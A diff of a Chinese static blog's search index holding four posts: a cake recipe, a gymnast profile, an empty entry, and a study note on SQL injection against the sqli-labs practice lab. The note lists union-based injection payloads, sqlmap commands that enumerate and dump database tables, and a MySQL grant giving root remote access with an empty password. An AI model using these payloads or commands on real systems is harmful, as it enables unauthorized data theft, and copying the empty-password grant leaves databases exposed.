@@ -1,59 +1,178 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>周二</title>
-      <link href="/2024/04/16/12/"/>
-      <url>/2024/04/16/12/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql注入</title>
-      <link href="/2024/04/15/4/"/>
-      <url>/2024/04/15/4/</url>
-      
-        <content type="html"><![CDATA[<h4 id="使用docker搭建靶场"><a href="#使用docker搭建靶场" class="headerlink" title="使用docker搭建靶场"></a>使用docker搭建靶场</h4><ul><li>首先虚拟机要换好源</li></ul><p>docker pull c0ny1&#x2F;sqli-labs</p><ul><li>查看安装好的docker镜像</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><ul><li>映射端口挂载文件。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 系统未占用端口:80 -p 系统未占用端口:3306 镜像id</span><br></pre></td></tr></table></figure><ul><li><p>查看正在运行的docker</p><p>docker ps</p></li><li><p>查看所有的docker</p><p>docker ps -a</p></li><li><p>进入docker容器</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></figure><ul><li>进入容器，设置数据库允许外部链接。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;&#x27;;</span><br></pre></td></tr></table></figure><h4 id="Mysql数据库"><a href="#Mysql数据库" class="headerlink" title="Mysql数据库"></a>Mysql数据库</h4><ul><li><p>数据库</p></li><li><p>表</p></li><li><p>字段</p></li><li><p>查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username =&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p>删</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from users where username = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p>增</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users (username,password) values (&#x27;admin&#x27;,&#x27;admin&#x27;);</span><br></pre></td></tr></table></figure><p>改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&#x27;123456&#x27; where username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure></li></ul><h4 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h4><ul><li><p>提示输入数字值的ID作为参数 我们输入?id&#x3D;1。 </p></li><li><p>通过数字值不同返回的内容也不同所以我们输入的内容是带入到数据库里面查询了。 </p></li><li><p>判断sql语句是否是拼接且是字符型还是数字型。 </p></li><li><p>判断是否存在注入</p></li></ul><p>​and 1&#x3D;1–+ and 1&#x3D;2–+ </p><ul><li>判断表有多少列</li></ul><p>​order by </p><ul><li>判断回显</li></ul><p>​union select 1,2,…</p><ul><li><p>联合查询库 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+</span><br></pre></td></tr></table></figure></li><li><p>联合查询表</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;--+</span><br></pre></td></tr></table></figure><ul><li><p>联合查询字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;--+</span><br></pre></td></tr></table></figure></li><li><p>联合查询字段值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(字段1 ,字段2 ,字段3) from users--+</span><br></pre></td></tr></table></figure></li></ul><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>探测目标（常用探测） </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.python sqlmap.py -u 目标url+get参数</span><br><span class="line">2.python sqlmap.py -r 流量包文件</span><br></pre></td></tr></table></figure><p>获取数据库名 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u 目标url --dbs</span><br></pre></td></tr></table></figure><p>获取表名 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 目标 -D 库名 --tables</span><br></pre></td></tr></table></figure><p>获取字段名 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 目标 -D 库名 -T 表名 --columns</span><br></pre></td></tr></table></figure><p>获取字段值 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 目标 -D 库名 -T 表名 --dump #获取全部</span><br><span class="line">sqlmap -u 目标 -D 库名 -T 表名 -C &quot;字段1,字段2,..&quot; --dump #获取指</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>制作美食</title>
-      <link href="/2024/04/15/222/"/>
-      <url>/2024/04/15/222/</url>
-      
-        <content type="html"><![CDATA[<h1 id="制作美味的巧克力蛋糕"><a href="#制作美味的巧克力蛋糕" class="headerlink" title="制作美味的巧克力蛋糕"></a>制作美味的巧克力蛋糕</h1><h2 id="材料"><a href="#材料" class="headerlink" title="材料"></a>材料</h2><ul><li>1 杯面粉</li><li>1 杯砂糖</li><li>1&#x2F;2 杯可可粉</li><li>1 茶匙泡打粉</li><li>1&#x2F;2 茶匙小苏打</li><li>1&#x2F;2 茶匙盐</li><li>2 个大鸡蛋</li><li>1&#x2F;2 杯牛奶</li><li>1&#x2F;4 杯沙拉油</li><li>2 茶匙香草提取物</li><li>1&#x2F;2 杯沸水</li><li>巧克力酱（作为装饰）</li></ul><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>预热烤箱至 350°F（175°C）。准备一个 9 英寸（23 厘米）的圆形蛋糕模具，涂抹一层薄薄的黄油或喷洒食用油喷剂。</p></li><li><p>在一个大碗中，将面粉、砂糖、可可粉、泡打粉、小苏打和盐混合均匀。</p></li><li><p>在另一个碗中，将鸡蛋、牛奶、沙拉油和香草提取物混合搅拌，直至充分融合。</p></li><li><p>将湿混合物倒入干混合物中，搅拌至无干粉。</p></li><li><p>慢慢地倒入沸水，持续搅拌，直至蛋糕糊变得顺滑。注意不要过度搅拌。</p></li><li><p>将蛋糕糊倒入准备好的蛋糕模具中。</p></li><li><p>把蛋糕放入预热好的烤箱中，烘烤约 30-35 分钟，或者直到用牙签插入蛋糕中心，牙签上没有粘着蛋糕糊就表示烤好了。</p></li><li><p>把烤好的蛋糕从烤箱中取出，待凉一段时间后，脱模。</p></li><li><p>把巧克力酱均匀地涂抹在蛋糕表面，根据个人喜好，可以撒上一些巧克力碎或坚果碎。</p></li><li><p>切片享用！</p></li></ol><h2 id="小贴士"><a href="#小贴士" class="headerlink" title="小贴士"></a>小贴士</h2><ul><li>可以根据个人口味在蛋糕糊中添加一些巧克力片或者坚果碎，增添口感和香气。</li><li>确保蛋糕完全冷却后再涂抹巧克力酱，这样巧克力酱才不会融化并滑落。</li><li>如果想要蛋糕更加松软湿润，可以在蛋糕糊中加入一些酸奶或者酸奶油。</li></ul>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>yanglong</title>
-      <link href="/2024/04/15/yanglong/"/>
-      <url>/2024/04/15/yanglong/</url>
-      
-        <content type="html"><![CDATA[<h1 id="杨龙：中国体操界的新星"><a href="#杨龙：中国体操界的新星" class="headerlink" title="杨龙：中国体操界的新星"></a>杨龙：中国体操界的新星</h1><p>杨龙，中国体操运动员，出生于湖北省武汉市。他以其出色的技艺和出色的表现而闻名于世，成为中国体操界的一颗新星。</p><h2 id="职业生涯"><a href="#职业生涯" class="headerlink" title="职业生涯"></a>职业生涯</h2><p>杨龙自幼展现出对体操的热爱和天赋。在青少年时期，他就开始接受专业的训练，并展现出了非凡的潜力。随着时间的推移，他在国内外比赛中频频斩获金牌，逐渐成为备受瞩目的新秀。</p><p>在国际赛场上，杨龙更是展现出了他的实力和魅力。他的优异表现吸引了全球观众的目光，为中国体操队赢得了荣誉，并为自己赢得了无数粉丝的喜爱。</p><h2 id="成就与荣誉"><a href="#成就与荣誉" class="headerlink" title="成就与荣誉"></a>成就与荣誉</h2><p>杨龙在其职业生涯中取得了许多令人瞩目的成就。他多次在世界体操锦标赛和奥运会等国际比赛中斩获奖牌，为中国体操队增添了荣耀。他的稳健表现和出色技艺为他赢得了许多称赞和尊重，成为了中国体操界的一面旗帜。</p><h2 id="未来展望"><a href="#未来展望" class="headerlink" title="未来展望"></a>未来展望</h2><p>杨龙的未来充满了无限的可能性。作为中国体操队的核心成员之一，他将继续努力训练，追求更高的成就。相信在他的努力下，他将为中国体操队带来更多荣誉，成为中国体操界的传奇人物之一。</p><p>杨龙以其出色的技艺和令人钦佩的精神赢得了广泛的认可和喜爱。他不仅是中国体操队的骄傲，也是全国体育界的典范，他的未来必定光芒万丈。</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-  
-  
+<search>
+  <entry>
+    <title>周二</title>
+    <url>/2024/04/16/12/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>制作美食</title>
+    <url>/2024/04/15/222/</url>
+    <content><![CDATA[<h1 id="制作美味的巧克力蛋糕"><a href="#制作美味的巧克力蛋糕" class="headerlink" title="制作美味的巧克力蛋糕"></a>制作美味的巧克力蛋糕</h1><h2 id="材料"><a href="#材料" class="headerlink" title="材料"></a>材料</h2><ul>
+<li>1 杯面粉</li>
+<li>1 杯砂糖</li>
+<li>1&#x2F;2 杯可可粉</li>
+<li>1 茶匙泡打粉</li>
+<li>1&#x2F;2 茶匙小苏打</li>
+<li>1&#x2F;2 茶匙盐</li>
+<li>2 个大鸡蛋</li>
+<li>1&#x2F;2 杯牛奶</li>
+<li>1&#x2F;4 杯沙拉油</li>
+<li>2 茶匙香草提取物</li>
+<li>1&#x2F;2 杯沸水</li>
+<li>巧克力酱（作为装饰）</li>
+</ul>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
+<li><p>预热烤箱至 350°F（175°C）。准备一个 9 英寸（23 厘米）的圆形蛋糕模具，涂抹一层薄薄的黄油或喷洒食用油喷剂。</p>
+</li>
+<li><p>在一个大碗中，将面粉、砂糖、可可粉、泡打粉、小苏打和盐混合均匀。</p>
+</li>
+<li><p>在另一个碗中，将鸡蛋、牛奶、沙拉油和香草提取物混合搅拌，直至充分融合。</p>
+</li>
+<li><p>将湿混合物倒入干混合物中，搅拌至无干粉。</p>
+</li>
+<li><p>慢慢地倒入沸水，持续搅拌，直至蛋糕糊变得顺滑。注意不要过度搅拌。</p>
+</li>
+<li><p>将蛋糕糊倒入准备好的蛋糕模具中。</p>
+</li>
+<li><p>把蛋糕放入预热好的烤箱中，烘烤约 30-35 分钟，或者直到用牙签插入蛋糕中心，牙签上没有粘着蛋糕糊就表示烤好了。</p>
+</li>
+<li><p>把烤好的蛋糕从烤箱中取出，待凉一段时间后，脱模。</p>
+</li>
+<li><p>把巧克力酱均匀地涂抹在蛋糕表面，根据个人喜好，可以撒上一些巧克力碎或坚果碎。</p>
+</li>
+<li><p>切片享用！</p>
+</li>
+</ol>
+<h2 id="小贴士"><a href="#小贴士" class="headerlink" title="小贴士"></a>小贴士</h2><ul>
+<li>可以根据个人口味在蛋糕糊中添加一些巧克力片或者坚果碎，增添口感和香气。</li>
+<li>确保蛋糕完全冷却后再涂抹巧克力酱，这样巧克力酱才不会融化并滑落。</li>
+<li>如果想要蛋糕更加松软湿润，可以在蛋糕糊中加入一些酸奶或者酸奶油。</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>sql注入</title>
+    <url>/2024/04/15/4/</url>
+    <content><![CDATA[<h4 id="使用docker搭建靶场"><a href="#使用docker搭建靶场" class="headerlink" title="使用docker搭建靶场"></a>使用docker搭建靶场</h4><ul>
+<li>首先虚拟机要换好源</li>
+</ul>
+<p>docker pull c0ny1&#x2F;sqli-labs</p>
+<ul>
+<li>查看安装好的docker镜像</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>映射端口挂载文件。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 系统未占用端口:80 -p 系统未占用端口:3306 镜像id</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>查看正在运行的docker</p>
+<p>docker ps</p>
+</li>
+<li><p>查看所有的docker</p>
+<p>docker ps -a</p>
+</li>
+<li><p>进入docker容器</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进入容器，设置数据库允许外部链接。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Mysql数据库"><a href="#Mysql数据库" class="headerlink" title="Mysql数据库"></a>Mysql数据库</h4><ul>
+<li><p>数据库</p>
+</li>
+<li><p>表</p>
+</li>
+<li><p>字段</p>
+</li>
+<li><p>查</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username =&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>删</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from users where username = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>增</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users (username,password) values (&#x27;admin&#x27;,&#x27;admin&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>改</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password=&#x27;123456&#x27; where username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h4><ul>
+<li><p>提示输入数字值的ID作为参数 我们输入?id&#x3D;1。 </p>
+</li>
+<li><p>通过数字值不同返回的内容也不同所以我们输入的内容是带入到数据库里面查询了。 </p>
+</li>
+<li><p>判断sql语句是否是拼接且是字符型还是数字型。 </p>
+</li>
+<li><p>判断是否存在注入</p>
+</li>
+</ul>
+<p>​			and 1&#x3D;1–+ and 1&#x3D;2–+ </p>
+<ul>
+<li>判断表有多少列</li>
+</ul>
+<p>​			order by </p>
+<ul>
+<li>判断回显</li>
+</ul>
+<p>​			union select 1,2,…</p>
+<ul>
+<li><p>联合查询库 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>联合查询表</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;--+</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>联合查询字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;--+</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>联合查询字段值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(字段1 ,字段2 ,字段3) from users--+</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>探测目标（常用探测） </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.python sqlmap.py -u 目标url+get参数</span><br><span class="line">2.python sqlmap.py -r 流量包文件</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库名 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u 目标url --dbs</span><br></pre></td></tr></table></figure>
+
+<p>获取表名 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 目标 -D 库名 --tables</span><br></pre></td></tr></table></figure>
+
+<p>获取字段名 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 目标 -D 库名 -T 表名 --columns</span><br></pre></td></tr></table></figure>
+
+<p>获取字段值 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 目标 -D 库名 -T 表名 --dump #获取全部</span><br><span class="line">sqlmap -u 目标 -D 库名 -T 表名 -C &quot;字段1,字段2,..&quot; --dump #获取指</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>yanglong</title>
+    <url>/2024/04/15/yanglong/</url>
+    <content><![CDATA[<h1 id="杨龙：中国体操界的新星"><a href="#杨龙：中国体操界的新星" class="headerlink" title="杨龙：中国体操界的新星"></a>杨龙：中国体操界的新星</h1><p>杨龙，中国体操运动员，出生于湖北省武汉市。他以其出色的技艺和出色的表现而闻名于世，成为中国体操界的一颗新星。</p>
+<h2 id="职业生涯"><a href="#职业生涯" class="headerlink" title="职业生涯"></a>职业生涯</h2><p>杨龙自幼展现出对体操的热爱和天赋。在青少年时期，他就开始接受专业的训练，并展现出了非凡的潜力。随着时间的推移，他在国内外比赛中频频斩获金牌，逐渐成为备受瞩目的新秀。</p>
+<p>在国际赛场上，杨龙更是展现出了他的实力和魅力。他的优异表现吸引了全球观众的目光，为中国体操队赢得了荣誉，并为自己赢得了无数粉丝的喜爱。</p>
+<h2 id="成就与荣誉"><a href="#成就与荣誉" class="headerlink" title="成就与荣誉"></a>成就与荣誉</h2><p>杨龙在其职业生涯中取得了许多令人瞩目的成就。他多次在世界体操锦标赛和奥运会等国际比赛中斩获奖牌，为中国体操队增添了荣耀。他的稳健表现和出色技艺为他赢得了许多称赞和尊重，成为了中国体操界的一面旗帜。</p>
+<h2 id="未来展望"><a href="#未来展望" class="headerlink" title="未来展望"></a>未来展望</h2><p>杨龙的未来充满了无限的可能性。作为中国体操队的核心成员之一，他将继续努力训练，追求更高的成就。相信在他的努力下，他将为中国体操队带来更多荣誉，成为中国体操界的传奇人物之一。</p>
+<p>杨龙以其出色的技艺和令人钦佩的精神赢得了广泛的认可和喜爱。他不仅是中国体操队的骄傲，也是全国体育界的典范，他的未来必定光芒万丈。</p>
+]]></content>
+  </entry>
 </search>
